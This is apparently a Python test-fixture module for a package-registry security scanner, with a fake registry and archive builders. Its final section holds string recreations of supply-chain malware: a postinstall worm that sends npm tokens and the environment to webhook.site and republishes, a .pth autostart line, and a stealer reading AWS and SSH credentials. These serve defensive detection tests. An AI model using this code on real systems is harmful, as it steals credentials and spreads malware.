"""Offline test doubles and inert recreations of 2026's attack patterns.

Nothing here can run. Payloads decode to harmless strings, hosts are
reserved example domains or test addresses, and the scanner only reads
these bytes; it never executes them.
"""

import base64
import hashlib
import io
import json
import tarfile
import zipfile
from datetime import datetime, timedelta, timezone

from bumpwatch.registry import Provenance, Registry, Release

NOW = datetime.now(timezone.utc)
HARMLESS = base64.b64encode(b"print('bumpwatch test fixture: inert')").decode()


# ------------------------------------------------------------------ archives

def npm_tgz(files: dict) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for path, data in files.items():
            data = data.encode() if isinstance(data, str) else data
            info = tarfile.TarInfo("package/" + path)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def wheel(name: str, version: str, files: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for path, data in files.items():
            zf.writestr(path, data)
        zf.writestr(f"{name}-{version}.dist-info/METADATA", f"Name: {name}\nVersion: {version}\n")
        zf.writestr(f"{name}-{version}.dist-info/RECORD", "")
    return buf.getvalue()


def sdist(name: str, version: str, files: dict) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for path, data in files.items():
            data = data.encode() if isinstance(data, str) else data
            info = tarfile.TarInfo(f"{name}-{version}/{path}")
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


# ------------------------------------------------------------------ fake registry

class FakeRegistry(Registry):
    def __init__(self):
        super().__init__(cache_dir="/nonexistent")
        self.releases = {}
        self.blobs = {}
        self.packuments = {}
        self.pypi_ages = {}

    def add(self, rel: Release, blobs: dict):
        """blobs: {kind_or_filename: bytes}"""
        rel.artifacts = []
        for key, data in blobs.items():
            url = f"https://fake/{rel.ecosystem}/{rel.name}/{rel.version}/{key}"
            self.blobs[url] = data
            kind = "npm" if rel.ecosystem == "npm" else ("wheel" if key.endswith(".whl") else "sdist")
            rel.artifacts.append({"url": url, "filename": key, "kind": kind,
                                  "sha256": hashlib.sha256(data).hexdigest() if kind != "npm" else None})
        self.releases[(rel.ecosystem, rel.name, rel.version)] = rel

    def release(self, ecosystem, name, version):
        return self.releases.get((ecosystem, name, version)) or Release(ecosystem, name, version, exists=False)

    def download(self, a):
        return self.blobs[a["url"]]

    def npm_packument(self, name):
        return self.packuments.get(name)

    def npm_age_days(self, name):
        doc = self.packuments.get(name) or {}
        created = doc.get("_age_days")
        return created

    def pypi_exists(self, name):
        return name in self.pypi_ages

    def pypi_age_days(self, name):
        return self.pypi_ages.get(name)


def npm_release(name, version, scripts=None, deps=None, days_ago=30, publisher="maintainer",
                trusted=True, provenance=True, repo="example/lib", recent=("maintainer",)):
    rel = Release("npm", name, version)
    rel.published = NOW - timedelta(days=days_ago)
    rel.publisher = publisher
    rel.trusted_publisher = trusted
    rel.has_provenance = provenance
    rel.provenance = Provenance(repo, ".github/workflows/release.yml") if provenance else None
    rel.repository = repo
    rel.install_scripts = dict(scripts or {})
    rel.dependencies = dict(deps or {})
    rel.recent_publishers = list(recent)
    return rel


def pypi_release(name, version, days_ago=30, provenance=True, repo="example/lib"):
    rel = Release("pypi", name, version)
    rel.published = NOW - timedelta(days=days_ago)
    rel.has_provenance = provenance
    rel.provenance = Provenance(repo, "release.yml") if provenance else None
    rel.repository = repo
    return rel


# ------------------------------------------------------------------ library code

LIB_JS = "'use strict';\nmodule.exports = function add(a, b) { return a + b; };\n"
LIB_PY = "def add(a, b):\n    return a + b\n"
PKG_JSON = json.dumps({"name": "demo-lib", "version": "1.0.0", "main": "index.js"})


# ------------------------------------------------------------------ recreations

# Shai-Hulud pattern: a postinstall script that harvests tokens, sends them
# out, republishes other packages with the stolen token and plants a
# workflow. Inert: never executed, example hosts only.
WORM_JS = """const fs = require('fs'), os = require('os'), cp = require('child_process'), https = require('https');
const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
const token = process.env.NPM_TOKEN || process.env.GITHUB_TOKEN;
const env = JSON.stringify(process.env);
const req = https.request({ hostname: 'webhook.site', path: '/00000000-test', method: 'POST' });
req.write(JSON.stringify({ npmrc, token, env })); req.end();
cp.execSync('npm publish --access public');
fs.writeFileSync('.github/workflows/shai-hulud.yml', 'on: push');
"""

# LiteLLM pattern: a .pth file that starts a hidden payload on every Python
# start, shipped only in the wheel. The payload decodes to a print().
PTH_LINE = f"import os, subprocess, sys; subprocess.Popen([sys.executable, '-c', 'import base64; exec(base64.b64decode(\"{HARMLESS}\"))'])\n"
STEALER_PY = f"""import base64, os, json, urllib.request
creds = open(os.path.expanduser('~/.aws/credentials')).read()
ssh = open(os.path.expanduser('~/.ssh/id_rsa')).read()
urllib.request.urlopen('http://198.18.0.10:8080/c', data=json.dumps(dict(os.environ)).encode())
exec(base64.b64decode("{HARMLESS}"))
"""
